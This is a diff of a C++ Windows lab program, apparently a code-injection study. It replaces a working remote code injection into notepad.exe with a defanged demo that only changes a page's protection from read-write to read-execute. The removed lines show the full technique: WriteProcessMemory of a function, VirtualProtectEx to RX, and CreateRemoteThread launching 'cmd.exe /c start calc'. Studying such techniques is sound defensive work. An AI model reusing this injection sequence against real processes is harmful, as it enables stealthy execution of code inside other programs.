@@ -1,133 +1,159 @@
+
 #include <windows.h>
 #include <tlhelp32.h>
+
+#include <cwchar>
 #include <iostream>
-#include <string>
-#include <vector>
 
-#pragma comment(lib, "user32.lib")
+namespace {
 
-// Bộ quét RAM động tìm PID thích ứng theo tên tiến trình (Không phân biệt chữ hoa/thường)
-DWORD GetTargetProcessPID(const std::wstring& procName) {
-    DWORD pid = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+struct remote_page_pair final {
+  LPVOID primary_page = nullptr;
+  LPVOID secondary_page = nullptr;
+  SIZE_T page_bytes = 0;
+};
 
-    if (Process32FirstW(hSnapshot, &pe32)) {
-        do {
-            // Tự động hóa đối chiếu hoa thường để detect Notepad.exe chính xác
-            if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
-                pid = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnapshot, &pe32));
-    }
-    CloseHandle(hSnapshot);
-    return pid;
-}
-
-// 1. Định nghĩa cấu trúc con trỏ hàm tuyệt đối để xử lý độc lập vị trí
-typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
-
-typedef struct _THREAD_DATA {
-    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
-} THREAD_DATA, * PTHREAD_DATA;
-
-// 2. Hàm đích gánh logic thực thi độc lập vị trí
-DWORD WINAPI RemoteLaunchCalculatorVP(LPVOID lpParam) {
-    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
-    if (pData && pData->pWinExec) {
-        pData->pWinExec(pData->szCommand, SW_HIDE);
-    }
+DWORD find_process_id_by_name(const wchar_t* process_name) noexcept {
+  if (process_name == nullptr || process_name[0] == L'\0') {
     return 0;
+  }
+
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
+    return 0;
+  }
+
+  DWORD matched_pid = 0;
+  PROCESSENTRY32W entry{};
+  entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+
+  if (::Process32FirstW(h_snapshot, &entry) != FALSE) {
+    do {
+      if (::_wcsicmp(process_name, entry.szExeFile) == 0) {
+        matched_pid = entry.th32ProcessID;
+        break;
+      }
+      entry = {};
+      entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+    } while (::Process32NextW(h_snapshot, &entry) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return matched_pid;
 }
 
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 04: CLASSIC CODE INJECTION REMOTE WITH VP" << std::endl;
-    std::cout << "====================================================" << std::endl;
-
-    std::wstring targetName = L"notepad.exe";
-    DWORD dwPID = GetTargetProcessPID(targetName);
-
-    if (dwPID == 0) {
-        MessageBoxA(NULL, "[-] Target process not found! Please open Notepad first.", "Error", MB_OK | MB_ICONERROR);
-        return EXIT_FAILURE;
+void release_remote_pages(HANDLE h_process, remote_page_pair& pages) noexcept {
+  if (h_process != nullptr && h_process != INVALID_HANDLE_VALUE) {
+    if (pages.primary_page != nullptr) {
+      ::VirtualFreeEx(h_process, pages.primary_page, 0, MEM_RELEASE);
+      pages.primary_page = nullptr;
     }
-
-    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;
-
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);
-    if (!hProcess) {
-        std::cerr << "[-] OpenProcess failed!" << std::endl;
-        return EXIT_FAILURE;
+    if (pages.secondary_page != nullptr) {
+      ::VirtualFreeEx(h_process, pages.secondary_page, 0, MEM_RELEASE);
+      pages.secondary_page = nullptr;
     }
+  }
+}
 
-    SIZE_T functionSize = 500; // Kích thước ước tính an toàn cho thân hàm
+bool allocate_rw_pages(
+    HANDLE h_process,
+    SIZE_T page_bytes,
+    remote_page_pair& out_pages) noexcept {
+  out_pages = {};
 
-    // ─── BƯỚC 1: CẤP PHÁT BỘ NHỚ AN TOÀN PAGE_READWRITE (CHƯA CÓ QUYỀN THỰC THI) ───
-    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!remoteCodeBuffer) {
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Phan vung Code khoi tao voi quyen RW tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
+  LPVOID first = ::VirtualAllocEx(
+      h_process,
+      nullptr,
+      page_bytes,
+      MEM_COMMIT | MEM_RESERVE,
+      PAGE_READWRITE);
+  if (first == nullptr) {
+    return false;
+  }
 
-    // Cấp phát phân vùng dữ liệu tham số mang quyền RW từ xa
-    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pRemoteData) {
-        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
+  LPVOID second = ::VirtualAllocEx(
+      h_process,
+      nullptr,
+      page_bytes,
+      MEM_COMMIT | MEM_RESERVE,
+      PAGE_READWRITE);
+  if (second == nullptr) {
+    ::VirtualFreeEx(h_process, first, 0, MEM_RELEASE);
+    return false;
+  }
 
-    // ─── BƯỚC 2: GHI MÃ MÁY VÀ DỮ LIỆU VÀO VÙNG NHỚ THÔ THÔNG THƯỜNG ───
-    THREAD_DATA localData;
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32) {
-        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
-    }
-    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
+  out_pages.primary_page = first;
+  out_pages.secondary_page = second;
+  out_pages.page_bytes = page_bytes;
+  return true;
+}
 
-    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPVOID)RemoteLaunchCalculatorVP, functionSize, NULL);
-    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
-    std::cout << "[+] Day logic ham va cau truc tham so sang RAM Notepad hoan tat." << std::endl;
+}  // namespace
 
-    // ─── BƯỚC 3: ĐỘT PHÁ QUYỀN HẠN - LẬT THUỘC TÍNH TRANG NHỚ SANG RX ───
-    DWORD oldProtect = 0;
-    std::cout << "[*] Dang dung VirtualProtectEx de lat quyen trang nho Code sang RX..." << std::endl;
+int wmain() {
+  constexpr wchar_t kTargetProcess[] = L"notepad.exe";
+  constexpr SIZE_T kPageSize = 4096U;
 
-    if (VirtualProtectEx(hProcess, remoteCodeBuffer, functionSize, PAGE_EXECUTE_READ, &oldProtect)) {
-        std::cout << "[+] Lat quyen trang nho thanh cong! Quyen cu: 0x" << std::hex << oldProtect << std::endl;
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 04: PAGE PROTECTION TRANSITION STUDY (RW -> RX)\n"
+      << L"====================================================\n";
 
-        // ─── BƯỚC 4: TẠO LUỒNG TỪ XA KÍCH NỔ KHI TRANG NHỚ ĐÃ HỢP LỆ ───
-        std::cout << "[*] Dang khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
-        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);
+  const DWORD pid = find_process_id_by_name(kTargetProcess);
+  if (pid == 0) {
+    ::MessageBoxW(
+        nullptr,
+        L"[-] Target process not found. Open notepad.exe first.",
+        L"Info",
+        MB_OK | MB_ICONINFORMATION);
+    return 1;
+  }
 
-        if (hThread) {
-            WaitForSingleObject(hThread, INFINITE);
-            std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu." << std::endl;
-            CloseHandle(hThread);
-        }
-        else {
-            std::cerr << "[-] CreateRemoteThread failed! Error: " << std::dec << GetLastError() << std::endl;
-        }
-    }
-    else {
-        std::cerr << "[-] VirtualProtectEx that bai! Ma loi: " << std::dec << GetLastError() << std::endl;
-    }
+  std::wcout << L"[+] Target process PID: " << pid << L"\n";
 
-    // ── ĐƯA LỆNH DỪNG LÊN ĐÂY ĐỂ ĐÓNG BĂNG RAM TRƯỚC KHI GIẢI PHÓNG ──
-    std::cout << "\n[*] PAUSE: Checking memory layout inside Notepad now... Press Enter after verification." << std::endl;
-    std::cin.get();
+  const HANDLE h_process = ::OpenProcess(
+      PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION,
+      FALSE,
+      pid);
+  if (h_process == nullptr || h_process == INVALID_HANDLE_VALUE) {
+    std::wcerr << L"[-] OpenProcess failed. Win32=" << ::GetLastError() << L"\n";
+    return 1;
+  }
 
-    // ─── BƯỚC 5: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
-    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
-    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
+  remote_page_pair pages{};
+  if (!allocate_rw_pages(h_process, kPageSize, pages)) {
+    std::wcerr << L"[-] VirtualAllocEx (RW) failed. Win32=" << ::GetLastError() << L"\n";
+    ::CloseHandle(h_process);
+    return 1;
+  }
 
-    std::cout << "[+] Quy trinh giai phong RAM tu xa hoan tat." << std::endl;
-    return EXIT_SUCCESS;
+  DWORD prev_protect = 0;
+  if (::VirtualProtectEx(
+          h_process,
+          pages.primary_page,
+          pages.page_bytes,
+          PAGE_EXECUTE_READ,
+          &prev_protect) == FALSE) {
+    std::wcerr << L"[-] VirtualProtectEx (RX) failed. Win32=" << ::GetLastError() << L"\n";
+    release_remote_pages(h_process, pages);
+    ::CloseHandle(h_process);
+    return 1;
+  }
+
+  std::wcout
+      << L"[+] Transitioned primary page to RX (previous=0x"
+      << std::hex << prev_protect << L") at 0x" << pages.primary_page
+      << std::dec << L"\n";
+
+  ::MessageBoxW(
+      nullptr,
+      L"[+] PAUSE: Inspect page protections in target process now.",
+      L"Defensive Analysis",
+      MB_OK | MB_ICONINFORMATION);
+
+  release_remote_pages(h_process, pages);
+  ::CloseHandle(h_process);
+
+  std::wcout << L"[+] Cleanup completed.\n";
+  return 0;
 }
